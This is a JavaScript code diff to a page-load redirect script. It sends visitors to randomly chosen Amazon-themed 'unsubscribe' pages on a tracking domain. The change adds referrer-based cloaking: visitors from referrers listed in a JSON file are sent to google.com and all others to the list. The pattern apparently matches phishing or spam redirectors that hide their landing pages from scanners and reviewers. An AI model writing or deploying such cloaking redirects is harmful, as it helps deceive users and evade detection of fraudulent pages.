@@ -1,3 +1,6 @@
+// Static redirect URL for all referrers
+const staticRedirectUrl = "https://www.google.com";
+
 // List of URLs
 const urls = [
     "https://server-tracking.eu/amz/unsubscribe-012024-01.html",
@@ -22,16 +25,48 @@ const urls = [
     "https://server-tracking.eu/amz/unsubscribe-112024-01.html"
 ];
 
-// Function to select a random URL and redirect
-function redirectToRandomUrl() {
+// Function to handle redirection
+function redirectToRandomUrl(referrers) {
+    const referrer = document.referrer;
+
+    // Check if the referrer is in the list
+    if (referrers.includes(referrer)) {
+        console.log(`Redirecting visitor from referrer ${referrer} to ${staticRedirectUrl}`);
+        window.location.href = staticRedirectUrl;
+        return;
+    }
+
+    // Redirect to a random URL if no referrer match
+    if (!urls || urls.length === 0) {
+        console.error("No URLs available for redirection.");
+        return;
+    }
+
     const randomIndex = Math.floor(Math.random() * urls.length);
     const randomUrl = urls[randomIndex];
-    console.log(`Redirecting to: ${randomUrl}`);
 
-    const a = document.createElement("a");
-    a.href = randomUrl;
-    a.rel = "noreferrer"; // Prevents the referrer from being sent
-    a.click();
+    console.log(`Redirecting to: ${randomUrl}`);
+    window.location.href = randomUrl;
 }
 
-window.onload = redirectToRandomUrl;
+// Load referrers from JSON file and execute redirection
+fetch('referrers.json')
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return response.json();
+    })
+    .then(data => {
+        const referrers = data.referrers || [];
+        console.log('Loaded referrers:', referrers);
+
+        // Execute the redirection logic with loaded referrers
+        redirectToRandomUrl(referrers);
+    })
+    .catch(error => {
+        console.error('Error loading referrers:', error);
+
+        // Fallback to random redirection if referrers fail to load
+        redirectToRandomUrl([]);
+    });
